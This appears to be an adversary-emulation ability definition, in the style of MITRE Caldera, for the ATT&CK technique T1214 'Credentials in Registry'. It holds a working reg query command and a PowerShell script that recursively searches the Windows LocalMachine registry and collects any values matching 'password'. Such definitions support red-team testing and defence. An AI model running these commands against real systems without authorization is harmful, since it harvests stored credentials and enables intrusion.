id: 3aad5312-d48b-4206-9de4-39866c12e60f
metadata:
  authors:
    - privateducky
    - MITRE
    - w0rk3r
  tags: []
name: Credentials in Registry
description: |
  The Windows registry is a local database storing all things configuration for the computer. In this case, we are looking
  for passwords that may be cached here.
tactic: credential-access
technique:
  id: T1214
  name: Credentials in Registry
platforms:
  windows:
    cmd:
      command: |
        reg query #{registry.hive} /f password /s
    psh:
      command: |
        $RegKeyFields = "KeyName","ValueName","Value";
        [System.Collections.ArrayList]$RegKeysArray  = $RegKeyFields;
        $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $env:computername);
        $RegPath = "#{registry.localmachine.key}";
        $RegKey= $Reg.OpenSubKey($RegPath);
        Function DigThroughKeys()
        {
        param (
            [Parameter(Mandatory=$true)]
            [AllowNull()]
            [AllowEmptyString()]
            [Microsoft.Win32.RegistryKey]$Key
            )
            if($Key.ValueCount -gt 0)
            {
                Foreach($value in $Key.GetValueNames())
                {
                    if(($Key.GetValue($value) -match "password") -or ($Key.Name -match "password"))
                    {
                        $item = New-Object PSObject;
                        $item | Add-Member -NotePropertyName "KeyName" -NotePropertyValue $Key.Name;
                        $item | Add-Member -NotePropertyName "ValueName" -NotePropertyValue $value.ToString();
                        $item | Add-Member -NotePropertyName "Value" -NotePropertyValue $Key.GetValue($value);
                        [void]$RegKeysArray.Add($item);
                    }
                }
            }
        if($Key.SubKeyCount -gt 0)
        {
            ForEach($subKey in $Key.GetSubKeyNames())
            {
                try {
                DigThroughKeys -Key $Key.OpenSubKey($subKey);
                }
                catch { continue }
            }
        }
        };
        DigThroughKeys -Key $RegKey;
        $RegKeysArray | Select-Object Value, KeyName, ValueName;
        $Reg.Close();